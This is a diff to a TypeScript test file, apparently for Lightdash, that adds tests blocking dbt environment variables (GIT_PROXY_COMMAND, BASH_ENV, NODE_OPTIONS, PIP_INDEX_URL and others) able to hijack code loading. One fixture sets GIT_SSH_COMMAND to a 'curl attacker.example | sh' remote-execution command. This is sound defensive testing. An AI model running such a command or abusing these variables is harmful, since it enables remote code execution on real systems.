@@ -1,4 +1,5 @@
 import {
+    buildSafeDbtEnvironmentVariables,
     DbtVersionOptionLatest,
     getDbtEnvironmentVariableKeyError,
     getDbtVersionSupportedWarehouses,
@@ -40,6 +41,32 @@ describe('dbt environment variable validation', () => {
         );
     });
 
+    test('blocks variables that relocate where dbt, python or git read code and config from', () => {
+        [
+            'HOME',
+            'PYTHONUSERBASE',
+            'PYTHONSTARTUP',
+            'PYTHONWARNINGS',
+            'GIT_EXTERNAL_DIFF',
+            'GIT_PROXY_COMMAND',
+            'GIT_CONFIG_GLOBAL',
+            'SSH_AUTH_SOCK',
+            'BASH_ENV',
+            'BASH_FUNC_deploy',
+            'GCONV_PATH',
+            'NODE_OPTIONS',
+            'DBT_TARGET_PATH',
+            'DBT_PROFILES_DIR',
+            'TMPDIR',
+            'XDG_CONFIG_HOME',
+            'PIP_INDEX_URL',
+        ].forEach((key) => {
+            expect(getDbtEnvironmentVariableKeyError(key)).toContain(
+                'cannot be used',
+            );
+        });
+    });
+
     test('reserves Lightdash profile variables for internal use', () => {
         const key = `${LIGHTDASH_DBT_PROFILE_ENV_VAR_PREFIX}PASSWORD`;
 
@@ -61,6 +88,28 @@ describe('dbt environment variable validation', () => {
                 { key: 'PYTHONPATH', value: '/tmp' },
             ]),
         ).toEqual(['GIT_SSH_COMMAND', 'PYTHONPATH']);
+    });
+
+    test('drops unsafe keys stored before validation existed', () => {
+        expect(
+            buildSafeDbtEnvironmentVariables([
+                { key: 'ENV', value: 'production' },
+                { key: '', value: 'ignored' },
+                { key: 'GIT_SSH_COMMAND', value: 'curl attacker.example | sh' },
+                { key: 'PYTHONUSERBASE', value: '/tmp/payload' },
+            ]),
+        ).toEqual({
+            environment: { ENV: 'production' },
+            blockedKeys: ['GIT_SSH_COMMAND', 'PYTHONUSERBASE'],
+        });
+    });
+
+    test('keeps Lightdash profile variables out of project environment', () => {
+        const key = `${LIGHTDASH_DBT_PROFILE_ENV_VAR_PREFIX}PASSWORD`;
+
+        expect(
+            buildSafeDbtEnvironmentVariables([{ key, value: 'stolen' }]),
+        ).toEqual({ environment: {}, blockedKeys: [key] });
     });
 });
 
